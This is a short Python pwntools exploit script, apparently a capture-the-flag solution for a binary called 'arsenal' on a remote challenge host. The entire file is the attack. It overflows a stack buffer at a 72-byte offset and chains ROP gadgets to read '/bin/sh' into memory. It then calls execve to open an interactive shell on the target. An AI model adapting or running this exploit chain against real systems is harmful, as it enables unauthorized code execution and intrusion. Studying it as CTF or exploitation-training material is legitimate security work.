#!/usr/bin/env python3
from pwn import *

elf = ELF('./arsenal', checksec=False)
context.binary = elf
context.arch = 'amd64'

OFFSET_TO_RIP = 72

pop_rdi = elf.sym.pop_rdi_ret
pop_rsi = elf.sym.pop_rsi_ret
pop_rdx = elf.sym.pop_rdx_ret
pop_rax = elf.sym.pop_rax_ret
syscall = elf.sym.syscall_ret
armory_addr = elf.sym.armory

HOST = "offsec.m0lecon.it"
PORT = 13562

def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi),
    p64(0),
    p64(pop_rsi),
    p64(armory_addr),
    p64(pop_rdx),
    p64(8),
    p64(pop_rax),
    p64(0),
    p64(syscall),
    p64(pop_rdi),
    p64(armory_addr),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx),
    p64(0),
    p64(pop_rax),
    p64(59),
    p64(syscall)
)

p.recvuntil(b"weapons:\n")
p.send(payload)
p.send(b"/bin/sh\x00")
p.interactive()